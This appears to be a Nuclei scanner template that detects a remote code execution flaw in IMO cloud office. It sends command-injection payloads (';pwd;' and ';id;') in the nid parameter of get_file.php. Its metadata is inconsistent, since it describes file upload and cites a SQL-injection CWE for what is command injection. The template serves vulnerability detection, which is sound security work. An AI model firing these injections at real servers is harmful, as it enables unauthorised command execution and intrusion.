flow: http(1) && http(2)
http:
- host-redirects: true
  matchers:
  - case-insensitive: true
    internal: true
    part: body
    type: word
    words:
    - imo
  max-redirects: 2
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body_1
    regex:
    - home/www/html/[^"]*/file/NDisk
    type: regex
  - part: body_2
    regex:
    - uid=[0-9]+.*gid=[0-9]+.*
    type: regex
  matchers-condition: and
  raw:
  - 'GET /file/NDisk/get_file.php?cid=1&nid=;pwd; HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /file/NDisk/get_file.php?cid=1&nid=;id; HTTP/1.1

    Host: {{Hostname}}

    '
id: imo-rce
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  description: 'The lax filtering of imo cloud office/file/NDisk/get_file.php allows
    unlimited file uploads. Attackers can directly obtain website permissions through
    this vulnerability.

    '
  metadata:
    max-request: 3
  name: IMO - Remote Code Execution
  reference:
  - https://www.henry4e36.top/index.php/archives/130.html#cl-1
  - https://forum.butian.net/article/213
  severity: critical
  tags: imo,rce,vuln
